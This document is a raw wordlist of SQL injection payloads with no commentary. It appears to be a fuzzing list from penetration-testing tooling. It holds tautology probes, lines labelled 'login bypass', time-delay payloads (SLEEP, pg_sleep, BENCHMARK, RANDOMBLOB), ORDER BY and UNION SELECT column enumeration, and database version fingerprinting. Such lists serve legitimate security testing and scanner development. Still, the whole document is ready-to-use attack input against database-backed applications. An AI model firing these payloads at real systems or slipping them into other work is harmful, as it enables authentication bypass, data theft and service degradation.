AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
AND 7300=7300 AND 'pKlZ'='pKlY
AND 7300=7300 AND ('pKlZ'='pKlY
AND 7300=7300 AND 'pKlZ'='pKlZ
AND 7300=7300 AND ('pKlZ'='pKlZ
AND 7506=9091 AND ('5913=5913
AND 7506=9091 AND (5913=5913
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
' and a='a
AND false
' AND id IS NULL; --
' AND MID(VERSION(),1,1) = '5';
' and 'one'='one
' and 'one'='one–
AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
and (select substring(@@version,1,1))='M'
and (select substring(@@version,1,1))='X'
and (select substring(@@version,2,1))='i'
and (select substring(@@version,2,1))='y'
and (select substring(@@version,3,1))='c'
and (select substring(@@version,3,1))='S'
and (select substring(@@version,3,1))='X'
AnD SLEEP(5)
AnD SLEEP(5)#
AnD SLEEP(5)--
' AnD SLEEP(5) ANd '1
' and substring(password/text(),1,1)='7
AND true
a' or 1=1--	' for password
AS INJECTX WHERE 1=1 AND 1=0
AS INJECTX WHERE 1=1 AND 1=0#
AS INJECTX WHERE 1=1 AND 1=0--
AS INJECTX WHERE 1=1 AND 1=1
AS INJECTX WHERE 1=1 AND 1=1#
AS INJECTX WHERE 1=1 AND 1=1--
`
benchmark(10000000,MD5(1))#
+benchmark(3200,SHA1(1))+'
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))#
benchmark(50000000,MD5(1))--
' GROUP BY columnnames having 1=1 --
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
HAVING 1=0
HAVING 1=0#
HAVING 1=0-- 
HAVING 1=1
HAVING 1=1#
HAVING 1=1-- 
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
like '%'
'LIKE'
....	
# Numeric
" or "" "
" or ""&"
" or ""*"
" or ""-"
" or ""^"
' or "
' or '' '
' or ''&'
' or ''*'
' or ''-'
' or ''='
' or ''^'
-- or # 
" OR "" = "
' OR '' = '
or 0=0 #
or 0=0 --
or 0=0 –
" or 0=0 #
" or 0=0 --
" or 0=0 –
%' or '0'='0
' or         0=0 #
' or 0=0 #
' or 0=0 --
' or 0=0 –
{ ' or 0=0 # }
' OR '1
' OR 1 -- -
OR 1=0
OR 1=0#
OR 1=0-- 
or 1=1#
or 1=1--
or 1=1/*
or 1=1–
" or "1"="1
" or "1"="1"#
" or "1"="1"--
" or "1"="1"/*
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1#
" or 1=1--
" or 1=1/*
" or 1=1–
") or "1"="1
") or "1"="1"#
") or "1"="1"--
") or "1"="1"/*
") or ("1"="1
") or ("1"="1"#
") or ("1"="1"--
") or ("1"="1"/*
' or '1'='1
' or '1'='1'#
' or '1'='1'--
' or '1'='1'/*
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1#
' or 1=1/*
' or 1=1;#
' or 1=1–
') or '1'='1
') or '1'='1'#
') or '1'='1'--
') or '1'='1'/*
') or '1'='1--
') or ('1'='1
') or ('1'='1'#
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1--
'or'1=1
'or'1=1′
) or '1′='1–
) or ('1′='1–
or 1=1
or 1=1#
or 1=1--
or 1=1/*
OR 1=1
" OR 1 = 1 -- -
OR 1=1
OR 1=1#
OR 1=1-- 
' or 1=1 LIMIT 1;#
OR 1=1	login bypass
' or 1=1#	login bypass
' or 1=1--	login bypass
' or 1=1/*	login bypass
') or '1'='1--	login bypass
') or ('1'='1--	login bypass
' OR 1=1--	login bypass
"or 1=1 or ""="
'or 1=1 or ''='
OR 1=2, and	login bypass
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 3409=3409 AND ('pytW' LIKE 'pytW
OR 3409=3409 AND ('pytW' LIKE 'pytY
" or "a"="a
") or ("a"="a
' or 'a'='a
' or a=a--
' or a=a–
') or ('a'='a
') or ('a'='a and hi") or ("a"="a
'=' 'or' and '=' 'or'
" or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))--
ORDER BY 1 
ORDER BY 1# 
ORDER BY 1-- 
ORDER BY 10 
ORDER BY 10# 
ORDER BY 10-- 
ORDER BY 11 
ORDER BY 11# 
ORDER BY 11-- 
ORDER BY 12 
ORDER BY 12# 
ORDER BY 12-- 
ORDER BY 13 
ORDER BY 13# 
ORDER BY 13-- 
ORDER BY 14 
ORDER BY 14# 
ORDER BY 14-- 
ORDER BY 15 
ORDER BY 15# 
ORDER BY 15-- 
ORDER BY 16 
ORDER BY 16# 
ORDER BY 16-- 
ORDER BY 17 
ORDER BY 17# 
ORDER BY 17-- 
ORDER BY 18 
ORDER BY 18# 
ORDER BY 18-- 
ORDER BY 19 
ORDER BY 19# 
ORDER BY 19-- 
ORDER BY 1,SLEEP(5)
ORDER BY 1,SLEEP(5)#
ORDER BY 1,SLEEP(5)-- 
ORDER BY 1,SLEEP(5),3#
ORDER BY 1,SLEEP(5),3-- 
ORDER BY 1,SLEEP(5),3,4#
ORDER BY 1,SLEEP(5),3,4-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
ORDER BY 2 
ORDER BY 2# 
ORDER BY 2-- 
ORDER BY 20 
ORDER BY 20# 
ORDER BY 20-- 
ORDER BY 21 
ORDER BY 21# 
ORDER BY 21-- 
ORDER BY 22 
ORDER BY 22# 
ORDER BY 22-- 
ORDER BY 23 
ORDER BY 23# 
ORDER BY 23-- 
ORDER BY 24 
ORDER BY 24# 
ORDER BY 24-- 
ORDER BY 25 
ORDER BY 25# 
ORDER BY 25-- 
ORDER BY 26 
ORDER BY 26# 
ORDER BY 26-- 
ORDER BY 27 
ORDER BY 27# 
ORDER BY 27-- 
ORDER BY 28 
ORDER BY 28# 
ORDER BY 28-- 
ORDER BY 29 
ORDER BY 29# 
ORDER BY 29-- 
ORDER BY 3 
ORDER BY 3# 
ORDER BY 3-- 
ORDER BY 30 
ORDER BY 30#
ORDER BY 30-- 
ORDER BY 31337 
ORDER BY 31337#
ORDER BY 31337-- 
ORDER BY 4 
ORDER BY 4# 
ORDER BY 4-- 
ORDER BY 5 
ORDER BY 5# 
ORDER BY 5-- 
ORDER BY 6 
ORDER BY 6# 
ORDER BY 6-- 
ORDER BY 7 
ORDER BY 7# 
ORDER BY 7-- 
ORDER BY 8 
ORDER BY 8# 
ORDER BY 8-- 
ORDER BY 9 
ORDER BY 9# 
ORDER BY 9-- 
ORDER BY SLEEP(5)#
ORDER BY SLEEP(5)-- 
ORDER BY SLEEP(5)#
ORDER BY SLEEP(5)--
' or 'one'='one
' or 'one'='one–
" or pg_sleep(5)--
") or pg_sleep(5)--
")) or pg_sleep(5)--
' or pg_sleep(5)--
') or pg_sleep(5)--
')) or pg_sleep(5)--
or pg_SLEEP(5)
or pg_SLEEP(5)#
or pg_SLEEP(5)--
" or sleep(5)#
" or sleep(5)="
") or sleep(5)="
")) or sleep(5)="
' or sleep(5)#
' or sleep(5)='
') or sleep(5)='
')) or sleep(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
or true
" or true--
") or true--
' or true--
') or true--
or true--
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
") or ("x")=("x
")) or (("x"))=(("x
') or ('x')=('x
') or ('x'='x
')) or (('x'))=(('x
' OR 'x'='x
' OR 'x'='x'#;
OR x=x
OR x=x#
OR x=x-- 
OR x=y
OR x=y#
OR x=y-- 
pg_sleep(5)--
pg_SLEEP(5)
pg_SLEEP(5)#
pg_SLEEP(5)--
RANDOMBLOB(1000000000/2)
RANDOMBLOB(500000000/2)
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
SELECT * FROM information_schema.tables
,(select * from (select(sleep(10)))a)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
SELECT * FROM v$version
SELECT @@version
SELECT version()
+ SLEEP(10) + '
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
sleep(5)#
&&SLEEP(5)
&&SLEEP(5)#
&&SLEEP(5)--
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
'&&SLEEP(5)&&'1
--
UNION ALL SELECT 1
UNION ALL SELECT 1#
UNION ALL SELECT 1-- 
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2#
UNION ALL SELECT 1,2-- 
UNION ALL SELECT 1,2,3
UNION ALL SELECT 1,2,3#
UNION ALL SELECT 1,2,3-- 
UNION ALL SELECT 1,2,3,4
UNION ALL SELECT 1,2,3,4#
UNION ALL SELECT 1,2,3,4-- 
UNION ALL SELECT 1,2,3,4,5
UNION ALL SELECT 1,2,3,4,5#
UNION ALL SELECT 1,2,3,4,5-- 
UNION ALL SELECT 1,2,3,4,5,6
UNION ALL SELECT 1,2,3,4,5,6#
UNION ALL SELECT 1,2,3,4,5,6-- 
UNION ALL SELECT 1,2,3,4,5,6,7
UNION ALL SELECT 1,2,3,4,5,6,7#
UNION ALL SELECT 1,2,3,4,5,6,7-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8
UNION ALL SELECT 1,2,3,4,5,6,7,8#
UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9
UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
' UNION ALL SELECT 1, @@version;#
UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX'
UNION ALL SELECT 'INJ'||'ECT'||'XXX'#
UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
